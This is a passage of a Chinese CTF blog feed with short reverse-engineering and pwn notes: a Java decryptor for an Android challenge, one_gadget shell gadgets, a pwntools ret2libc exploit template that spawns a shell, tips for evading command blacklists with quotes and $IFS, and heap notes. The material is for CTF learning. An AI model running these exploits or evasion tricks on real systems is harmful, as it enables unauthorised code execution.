MainActivity.<span class="built_in">this</span>.f3919p.setImageBitmap(BitmapFactory.decodeByteArray(bArr6, <span class="number">0</span>, bArr6.length));</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>最后根据代码逻辑推出的解密exp</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> net.jpountz.lz4.LZ4SafeDecompressor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.Inflater;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> net.jpountz.lz4.LZ4Factory;</span><br><span class="line"><span class="keyword">import</span> net.jpountz.lz4.LZ4Compressor;</span><br><span class="line"><span class="keyword">import</span> net.jpountz.lz4.LZ4FastDecompressor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Read2</span><span class="params">(String infile)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(infile);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span>  <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">byte</span> buffer[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>((len = fis.read(buffer)) != -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sb.append(<span class="keyword">new</span> <span class="title class_">String</span>(buffer, <span class="number">0</span>, len));</span><br><span class="line">            <span class="comment">//sb.append(new String(buffer, 0, len, &quot;UTF-8&quot;));   //将byte转String可以指定编码方式</span></span><br><span class="line">        &#125;</span><br><span class="line">        fis.close();</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Key <span class="title function_">get_key</span><span class="params">(<span class="type">byte</span>[] arg4)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line">        <span class="type">byte</span>[] v1 = <span class="keyword">new</span> <span class="title class_">byte</span>[v0];</span><br><span class="line">        <span class="type">int</span> v2;</span><br><span class="line">        <span class="keyword">for</span>(v2 = <span class="number">0</span>; v2 &lt; arg4.length; ++v2) &#123;</span><br><span class="line">            <span class="keyword">if</span>(v2 &gt;= v0) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v1[v2] = arg4[v2];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(v1, <span class="string">&quot;DES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream;</span><br><span class="line">        <span class="type">byte</span>[] byteArray2=<span class="literal">null</span>;</span><br><span class="line">        DataInputStream dataInputStream=<span class="literal">null</span>;</span><br><span class="line">        <span class="type">byte</span>[] bArr=<span class="literal">null</span>;</span><br><span class="line">        <span class="type">byte</span>[] byteArray=<span class="literal">null</span>;</span><br><span class="line">        <span class="type">byte</span>[] bArr3=<span class="literal">null</span>;</span><br><span class="line">        <span class="type">byte</span>[] bArr2=<span class="literal">null</span>;</span><br><span class="line">        <span class="type">byte</span>[] bArr6 = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            dataInputStream = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\EDGE下载\\task_DesignEachStep\\DesignEachStep\\assets\\data\\data&quot;</span>));</span><br><span class="line">            <span class="type">byte</span>[] bArr7 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">256</span>];</span><br><span class="line">            byteArray2=<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">400</span>];</span><br><span class="line">            byteArrayOutputStream = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">read</span> <span class="operator">=</span> dataInputStream.read(bArr7);</span><br><span class="line">                <span class="keyword">if</span> (read &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                byteArrayOutputStream.write(bArr7, <span class="number">0</span>, read);</span><br><span class="line">            &#125;</span><br><span class="line">            byteArray2 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span></span><br><span class="line">        &#123;</span><br><span class="line">            dataInputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (byteArray2.length &gt;= <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="type">byte</span>[] bArr8 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8</span>];</span><br><span class="line">            System.arraycopy(byteArray2, <span class="number">0</span>, bArr8, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="type">byte</span>[] bArr9 = <span class="keyword">new</span> <span class="title class_">byte</span>[byteArray2.length - <span class="number">8</span>];</span><br><span class="line">            System.arraycopy(byteArray2, <span class="number">8</span>, bArr9, <span class="number">0</span>, byteArray2.length - <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">                cipher.init(<span class="number">2</span>, get_key(bArr8));</span><br><span class="line">                bArr = cipher.doFinal(bArr9);</span><br><span class="line">                <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\EDGE下载\\task_DesignEachStep\\DesignEachStep\\assets\\data\\data2&quot;</span>);</span><br><span class="line">                fos.write(bArr);</span><br><span class="line">                fos.close();</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;cipher error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Inflater</span> <span class="variable">inflater</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Inflater</span>();</span><br><span class="line">            inflater.setInput(bArr);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(bArr.length);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">byte</span>[] bArr10 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">while</span> (!inflater.finished()) &#123;</span><br><span class="line">                    byteArrayOutputStream2.write(bArr10, <span class="number">0</span>, inflater.inflate(bArr10));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;inflater error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            inflater.end();</span><br><span class="line">            byteArray = byteArrayOutputStream2.toByteArray();</span><br><span class="line">            byteArrayOutputStream2.close();</span><br><span class="line">            <span class="keyword">if</span> (byteArray.length &gt;= <span class="number">8</span>) &#123;</span><br><span class="line">                <span class="type">byte</span>[] bArr11 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8</span>];</span><br><span class="line">                System.arraycopy(byteArray, <span class="number">0</span>, bArr11, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">                <span class="type">byte</span>[] bArr12 = <span class="keyword">new</span> <span class="title class_">byte</span>[byteArray.length - <span class="number">8</span>];</span><br><span class="line">                System.arraycopy(byteArray, <span class="number">8</span>, bArr12, <span class="number">0</span>, byteArray.length - <span class="number">8</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Cipher</span> <span class="variable">cipher2</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">                    cipher2.init(<span class="number">2</span>, get_key(bArr11));</span><br><span class="line">                    bArr3 = cipher2.doFinal(bArr12);</span><br><span class="line">                    <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\EDGE下载\\task_DesignEachStep\\DesignEachStep\\assets\\data\\data3&quot;</span>);</span><br><span class="line">                    fos.write(bArr3);</span><br><span class="line">                    fos.close();</span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)</span><br><span class="line">                &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;cipher2 error &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            bArr2=bArr3;</span><br><span class="line">            <span class="type">byte</span>[] bArr13 = <span class="keyword">new</span> <span class="title class_">byte</span>[bArr2.length * <span class="number">5</span>];</span><br><span class="line">            <span class="type">LZ4SafeDecompressor</span> <span class="variable">safeDecompressor</span> <span class="operator">=</span> LZ4Factory.safeInstance().safeDecompressor();</span><br><span class="line">            <span class="type">int</span> <span class="variable">decompress</span> <span class="operator">=</span> safeDecompressor.decompress(bArr2, <span class="number">0</span>, bArr2.length, bArr13, <span class="number">0</span>);</span><br><span class="line">            <span class="type">byte</span>[] bArr14 = <span class="keyword">new</span> <span class="title class_">byte</span>[decompress];</span><br><span class="line">            System.arraycopy(bArr13, <span class="number">0</span>, bArr14, <span class="number">0</span>, decompress);</span><br><span class="line">            <span class="type">byte</span>[] bArr15 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8</span>];</span><br><span class="line">            System.arraycopy(bArr14, <span class="number">0</span>, bArr15, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> decompress - <span class="number">8</span>;</span><br><span class="line">            <span class="type">byte</span>[] bArr16 = <span class="keyword">new</span> <span class="title class_">byte</span>[i];</span><br><span class="line">            System.arraycopy(bArr14, <span class="number">8</span>, bArr16, <span class="number">0</span>, i);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Cipher</span> <span class="variable">cipher3</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">                cipher3.init(<span class="number">2</span>, get_key(bArr15));</span><br><span class="line">                bArr6 = cipher3.doFinal(bArr16);</span><br><span class="line">                <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\EDGE下载\\task_DesignEachStep\\DesignEachStep\\assets\\data\\data4.png&quot;</span>);</span><br><span class="line">                fos.write(bArr6);</span><br><span class="line">                fos.close();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;cipher 3 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>虽然中间好像少了8位的密钥，但flag就是最后的png图片data4（doge），那就不管了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230010878.png"
                      alt="image-20230623001026699"
                ></p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>one_gadget</title>
    <url>/2024/05/24/Pwn/linux/tool/one_gadget/</url>
    <content><![CDATA[<p>可通过glibc来获取shell</p>
<p><code>pip3 install one_gadget</code>安装即可</p>
<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><blockquote>
<p>通过<code>one_gadget libc路径</code>找到对应的 <code>get shell</code>地址和 <code>get shell</code>的条件</p>
<p>如下面的</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(wrwrw㉿DESKTOP-1DM15A6)-[~]</span><br><span class="line">└─$ one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x4d74c posix_spawn(rsp+0xc, &quot;/bin/sh&quot;, 0, rbx, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  address rsp+0x68 is writable</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rax == NULL || &#123;&quot;sh&quot;, rax, rip+0x14a6c3, r12, ...&#125; is a valid argv</span><br><span class="line">  rbx == NULL || (u16)[rbx] == NULL</span><br><span class="line"></span><br><span class="line">0x4d753 posix_spawn(rsp+0xc, &quot;/bin/sh&quot;, 0, rbx, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  address rsp+0x68 is writable</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL || &#123;rcx, rax, rip+0x14a6c3, r12, ...&#125; is a valid argv</span><br><span class="line">  rbx == NULL || (u16)[rbx] == NULL</span><br><span class="line"></span><br><span class="line">0xd636b execve(&quot;/bin/sh&quot;, rbp-0x40, r13)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x38 is writable</span><br><span class="line">  rdi == NULL || &#123;&quot;/bin/sh&quot;, rdi, NULL&#125; is a valid argv</span><br><span class="line">  [r13] == NULL || r13 == NULL || r13 is a valid envp</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>例如</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">0x4d74c posix_spawn(rsp+0xc, &quot;/bin/sh&quot;, 0, rbx, rsp+0x50, environ)#posix_spawn 类似于system 也是执行函数</span><br><span class="line">constraints:#获取shell的约束条件 </span><br><span class="line">  address rsp+0x68 is writable#rsp+0x68是可写的</span><br><span class="line">  rsp &amp; 0xf == 0#rsp &amp; 0xf为0</span><br><span class="line">  rax == NULL || &#123;&quot;sh&quot;, rax, rip+0x14a6c3, r12, ...&#125; is a valid argv</span><br><span class="line">  rbx == NULL || (u16)[rbx] == NULL</span><br></pre></td></tr></table></figure></div>

</blockquote>
]]></content>
      <categories>
        <category>Pwn</category>
        <category>linux</category>
        <category>tool</category>
      </categories>
  </entry>
  <entry>
    <title>pwn格式</title>
    <url>/2024/04/12/Pwn/linux/tool/pwn%E6%A0%BC%E5%BC%8F/</url>
    <content><![CDATA[<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">elf=ELF(r&quot;/home/wrwrw/vscode/pwn/moectf/ret2libc/pwn&quot;)</span><br><span class="line">dll=</span><br><span class="line">debug=True</span><br><span class="line">if debug==True:</span><br><span class="line">    context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;,terminal=&#x27;bash&#x27;)</span><br><span class="line">    p=process(r&quot;/home/wrwrw/vscode/pwn/moectf/ret2libc/pwn&quot;)</span><br><span class="line">    # pwnlib.gdb.attach(p,&#x27;break main&#x27;)</span><br><span class="line">else:</span><br><span class="line">    p=remote(&quot;127.0.0.1&quot; ,30671 )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">    puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">    inputs=0x04011E8</span><br><span class="line">    pop_rdi_retn=0x000000000040117e#ROPgadget --binary babyof --only &#x27;pop|ret&#x27; |grep rdi</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(&#x27;But..maybe libc can help u??\n&#x27;,b&#x27;a&#x27;*0x58+p64(pop_rdi_retn)+p64(puts_plt)+p64(puts_plt)+p64(inputs))</span><br><span class="line">    p.recvline()</span><br><span class="line">    a=p.recvline(keepends=False)</span><br><span class="line">    puts=u64(a.ljust(8,b&#x27;\00&#x27;))</span><br><span class="line">    libc=LibcSearcher(&#x27;puts&#x27;,puts)</span><br><span class="line">    base=puts-libc.dump(&#x27;puts&#x27;)#此处是与泄露的got地址相减</span><br><span class="line">    system=base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">    sh=base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">    ret=0x000000000040101a #ROPgadget --binary pwn --only &#x27;ret&#x27;</span><br><span class="line">    p.sendafter(&#x27;But..maybe libc can help u??\n&#x27;,b&#x27;a&#x27;*0x58+p64(ret)+p64(pop_rdi_retn)+p64(sh)+p64(system)+b&#x27;\n&#x27;)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Pwn</category>
        <category>linux</category>
        <category>tool</category>
      </categories>
  </entry>
  <entry>
    <title>通过wsl实时pwn</title>
    <url>/2023/07/21/Pwn/linux/tool/%E9%80%9A%E8%BF%87wsl%E5%AE%9E%E6%97%B6pwn/</url>
    <content><![CDATA[<p>vscode可装wsl插件与wsl远程连接</p>
<p>因为windows的环境跟linux不同获取了shell也无法正常执行命令所以需要使用wsl终端</p>
]]></content>
      <categories>
        <category>Pwn</category>
        <category>linux</category>
        <category>tool</category>
      </categories>
  </entry>
  <entry>
    <title>PIE保护</title>
    <url>/2023/10/28/Pwn/linux/%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD/PIE%E4%BF%9D%E6%8A%A4/</url>
    <content><![CDATA[<p>PIE保护不会随机化低12bit位，如果 shell在附近 可以通过爆破低6位来获得完整的低2字节</p>
]]></content>
      <categories>
        <category>Pwn</category>
        <category>linux</category>
        <category>保护措施</category>
      </categories>
  </entry>
  <entry>
    <title>seccomp</title>
    <url>/2024/06/07/Pwn/linux/%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD/seccomp/</url>
    <content><![CDATA[<p>Sandbox的安全机制，用于限制系统调用</p>
<p>可用seccomp-tools 来查看是否启用对应的沙箱检测</p>
<p><code>seccomp-tools dump 对应程序</code></p>
]]></content>
      <categories>
        <category>Pwn</category>
        <category>linux</category>
        <category>保护措施</category>
      </categories>
  </entry>
  <entry>
    <title>跳过黑名单</title>
    <url>/2023/04/12/Pwn/linux/%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD/%E8%B7%B3%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95/</url>
    <content><![CDATA[<p>可用引号来截断来绕过对应的黑名单检测</p>
<p>同时可用$IFS来代替空格</p>
<p>但$IFS如果后面跟了其他字符就不知道$这个符号到底持续到什么位置所以需要“空”来中断$的作用位置如$9-第九个参数</p>
<p>如果实际没有第九个参数就是为空,用其他为空的代替也一样</p>
]]></content>
      <categories>
        <category>Pwn</category>
        <category>linux</category>
        <category>保护措施</category>
      </categories>
  </entry>
  <entry>
    <title>堆溢出</title>
    <url>/2024/03/26/Pwn/linux/%E5%A0%86/%E5%A0%86%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<p>通过覆盖相临堆块达成修改对应堆块</p>
<p>根据下面这个结构</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> prev_size;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">int</span> size;<span class="comment">//注意16字节对齐</span></span><br><span class="line">    	<span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    	&#123;</span></span><br><span class="line">        	<span class="type">int</span> flag:<span class="number">3</span>;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">            	<span class="type">bool</span> PREV_INUSE:<span class="number">1</span>;<span class="comment">//如果前面一个chunk处于分配状态，那么此位为1。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个chunk 的size 的P位为0时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并</span></span><br><span class="line">            	<span class="type">bool</span> IS_MAPPED:<span class="number">1</span>;<span class="comment">//记录当前chunk是否是由mmap分配的</span></span><br><span class="line">            	<span class="type">bool</span> NON_MAIN_AREA:<span class="number">1</span>;<span class="comment">//记录当前 chunk 是否不属于主线程</span></span><br><span class="line">            &#125;;</span><br><span class="line">    	&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">    <span class="type">char</span>* data[size&amp;<span class="number">0xFFFFFFF8</span>];<span class="comment">//只取高29位</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>UAF Example:</p>
<blockquote>
<p>[<a class="link"   href="https://www.nssctf.cn/problem/2058" >NISACTF 2022]ezheap | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *command; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  s = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x16</span>u);</span><br><span class="line">  command = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x16</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  system(command);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


</blockquote>
]]></content>
      <categories>
        <category>Pwn</category>
        <category>linux</category>
        <category>堆</category>
      </categories>
  </entry>
  <entry>
    <title>堆结构</title>
    <url>/2024/06/08/Pwn/linux/%E5%A0%86/%E5%A0%86%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p>已经申请的堆结构类似于下面</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> prev_size;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">int</span> size;<span class="comment">//注意4字节对齐,&amp;表示整过</span></span><br><span class="line">    	<span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    	&#123;</span></span><br><span class="line">        	<span class="type">int</span> flag:<span class="number">3</span>;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">            	<span class="type">bool</span> PREV_INUSE:<span class="number">1</span>;<span class="comment">//如果前面一个chunk处于分配状态，那么此位为1。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个chunk 的size 的P位为0时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并</span></span><br><span class="line">            	<span class="type">bool</span> IS_MAPPED:<span class="number">1</span>;<span class="comment">//记录当前chunk是否是由mmap分配的</span></span><br><span class="line">            	<span class="type">bool</span> NON_MAIN_AREA:<span class="number">1</span>;<span class="comment">//记录当前 chunk 是否不属于主线程</span></span><br><span class="line">            &#125;;</span><br><span class="line">    	&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">    <span class="type">char</span>* data[(size&amp;<span class="number">0xFFFFFFF8</span>)<span class="number">-8</span>];<span class="comment">//只取高29位</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Pwn</category>
        <category>linux</category>
        <category>堆</category>
      </categories>
  </entry>
  <entry>
    <title>ChipWhisperer</title>
    <url>/2024/03/12/Re/IOT/%E4%BE%A7%E4%BF%A1%E9%81%93/ChipWhisperer/</url>
    <content><![CDATA[<p>测信道攻击工具</p>
<p><a class="link"   href="https://chipwhisperer.readthedocs.io/en/latest/index.html" >ChipWhisperer — ChipWhisperer 5.7.0 documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Re</category>
        <category>IOT</category>
        <category>侧信道</category>
      </categories>
  </entry>
  <entry>
    <title>ida调试</title>
    <url>/2024/04/17/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/QEMU/ida%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>QEMU</category>
      </categories>
  </entry>
  <entry>
    <title>riscv</title>
    <url>/2024/04/17/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/QEMU/riscv/</url>
    <content><![CDATA[<p><code>qemu-system-riscv64 -machine virt -nographic -bios ./rustsbi-qemu.bin -device loader,file=./os.bin,addr=0x80200000</code></p>
]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>QEMU</category>
      </categories>
  </entry>
  <entry>
    <title>claripy</title>
    <url>/2024/01/18/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/angr%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6/claripy/</url>
    <content><![CDATA[<p>类似于z3用于创建变量求解（可用于argv传参或者 寄存器传参）</p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><blockquote>
<p>BVS -用于创建位向量符号  </p>
<p><code>BVS(&#39;变量名&#39;,长度)</code></p>
<p>BVV -用于创建位向量值(主要用于添加条件)</p>
<p><code>BVV(bytes数据)</code></p>
</blockquote>
<h2 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h2><blockquote>
<p>stdin 标准输入现在似乎不支持添加条件 或者只对应架构下系统添加条件 比如pe文件则需要在windows环境下添加</p>
<p>寄存器</p>
<blockquote>
<p>example:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">flag=BVS(<span class="string">&#x27;flag&#x27;</span>,<span class="number">8</span>*(flag_length))<span class="comment">#BVS长度单位是bit,创建变量对象</span></span><br><span class="line">state=p.factory.entry_state()<span class="comment">#创建状态对象</span></span><br><span class="line">state.regs.eax=flag<span class="comment">#不会超过eax大小</span></span><br></pre></td></tr></table></figure></div>


</blockquote>
<p>内存</p>
<blockquote>
<p>example:</p>
